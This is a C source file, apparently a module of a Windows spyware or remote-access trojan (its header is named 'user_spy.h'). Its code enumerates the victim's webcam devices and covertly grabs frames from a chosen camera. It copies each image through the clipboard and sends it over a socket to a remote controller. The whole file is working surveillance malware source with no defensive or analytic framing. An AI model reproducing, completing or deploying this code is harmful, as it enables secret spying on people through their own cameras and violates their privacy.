#include "user_spy.h"
#include <vfw.h>

#pragma pack(1)
struct cam_device_info
{
    UINT i ;
    char devname[80];
    char version[80];
};

void List_Webcam(SOCKET sock)
{
   struct cam_device_info info;
    for(info.i=0;info.i<10;info.i++)
    {
        if(capGetDriverDescriptionA(info.i,info.devname,sizeof(info.devname),info.version,sizeof(info.version)))
        {
            send(sock,(char *)&info,sizeof(info),0);
        }
    }

    ZeroMemory(&info,sizeof(info));
    info.i=404;
    send(sock,(char *)&info,sizeof(info),0);
    return ;
}


void Webcam_Capture(SOCKET sock)
{
    HWND cam=NULL;HBITMAP bitmap=NULL;DWORD id;SPY_ERROR Err;BOOL Success = 1;

    ZeroMemory(&Err,sizeof(Err));

    recv(sock,(char *)&id,4,0);


    Err.code = 404;

    cam = capCreateCaptureWindowA("Webcam",0,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,0);
    if(cam == NULL)
    {
        Success = 0;goto __Cleanup;
    }

    if(!SendMessageA(cam,WM_CAP_DRIVER_CONNECT,id,0L))
    {
        Success = 0;goto __Cleanup;
    }

    if(!SendMessage(cam, WM_CAP_GRAB_FRAME, 0, 0))
    {
        Success = 0;goto __Cleanup;
    }

    if(!SendMessage(cam, WM_CAP_EDIT_COPY, 0, 0))
    {
        Success = 0;goto __Cleanup;
    }

    SendMessage(cam,WM_CAP_DRIVER_DISCONNECT,0,0L);

    if(OpenClipboard(cam))
    {
        bitmap = (HBITMAP)GetClipboardData(2);
        if(!Compress_and_Send(bitmap,sock,&Err.reason))
        {
            Success = 0;
        }
        EmptyClipboard();
        CloseClipboard();
    }
    else
        Success = 0;

    __Cleanup:
        if(!Success)
        {
            if(!Err.reason)
            {
                Err.reason = GetLastError();
            }
            send(sock,(char *)&Err,sizeof(Err),0);
        }
        if(bitmap)
        {
            DeleteObject(bitmap);
        }
        if(cam)
        {
            DestroyWindow(cam);
        }

        return ;
}
